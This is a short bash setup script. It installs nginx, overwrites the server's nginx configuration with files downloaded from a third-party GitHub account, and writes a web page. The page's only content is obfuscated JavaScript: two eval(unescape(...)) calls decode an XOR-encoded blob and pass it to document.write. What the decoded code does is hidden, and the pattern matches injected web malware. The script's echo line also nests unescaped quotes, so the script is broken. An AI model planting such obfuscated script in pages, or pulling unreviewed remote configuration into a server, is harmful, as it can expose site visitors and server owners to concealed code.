#!/bin/bash
apt install nginx

cd
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/95dewadew/config/master/nginx.conf"
wget -O /etc/nginx/sites-enabled/default "https://raw.githubusercontent.com/95dewadew/config/master/default"

mkdir -p /root/users
echo "<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%64%38%32%37%62%64%37%64%30%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%30%31%38%38%39%34%32%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%39%30%33%31%36%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%32%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%64%38%32%37%62%64%37%64%30%28%27') + '%3a%7c%66%7c%6b%74%70%47%06%0c%21%23%24%26%2b%21%2a%22%24%73%60%7f%56%68%6e%61%75%7e%75%22%68%71%76%62%7f%6b%72%71%2c%2f%74%0c%04%22%24%24%25%2b%22%21%23%24%26%2b%21%71%6b%76%60%76%70%30%6d%70%63%67%7f%68%79%70%36%6c%73%6e%68%21%3e%24%2d%63%75%7e%72%3a%37%36%65%63%6a%70%65%74%7c%76%62%30%63%77%68%20%3d%0c%0d%24%26%2b%21%2a%22%24%24%25%76%2e%21%36%34%36%3b%28%35%0f%0a%24%25%2b%22%21%23%38%35%7c%66%7c%6b%74%70%47%06%0c%3d%73%72%63%49%3d%6d%67%76%70%60%7d%40%3d%6a%69%6d%2b%76%7c%65%39%22%6d%7f%76%71%3d%37%35%65%60%61%71%65%76%72%7c%6a%33%64%77%6b%38%6b%6b%78%6d%63%76%79%30%71%71%6f%20%2b%65%6b%76%65%29%76%7d%6b%6a%6a%76%67%67%2c%62%67%6d%6f%6d%7f%3f%27%32%32%36%2d%21%6e%63%70%65%28%78%74%68%68%6d%74%6a%6d%27%79%6d%60%71%63%3f%27%32%32%36%2d%21%62%67%6d%6f%6d%7f%3f%27%34%32%36%2d%21%71%6b%60%70%6d%36%24%36%35%34%20%2b%32%48%3e%37%65%47%37%31%66%66%76%72%6e%77%48%3e%62%72%47%37%65%64%71%70%63%7d%43%36%68%77%76%71%2b%65%72%6f%77%70%36%27%7c%67%60%22%25%7c%6b%7f%66%39%20%3e%31%2c%40%24%53%40%5f%57%51%23%42%5f%35%21%44%57%43%4b%5c%2b%58%44%51%4f%43%4a%53%4d%47%38%37%63%49%3e%32%69%77%74%7f%43%36%31%63%61%77%7f%67%77%41%38%35%7b%77%6f%4020188942%34%39%33%38%30%36%36' + unescape('%27%29%29%3b'));
// -->
</script>"> /root/users/index.html

service nginx restart
